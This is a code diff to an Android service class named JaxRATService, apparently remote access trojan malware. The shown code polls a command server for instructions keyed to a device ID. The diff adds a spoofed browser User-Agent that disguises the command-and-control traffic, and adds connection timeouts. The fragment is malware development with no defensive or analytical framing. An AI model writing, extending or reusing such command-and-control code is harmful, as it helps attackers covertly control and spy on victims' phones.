@@ -85,6 +85,9 @@ public class JaxRATService extends Service {
                 URL url = new URL(SERVER_URL + "/api/get_command/" + DEVICE_ID);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("GET");
+                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
                 BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                 StringBuilder response = new StringBuilder();
                 String line;
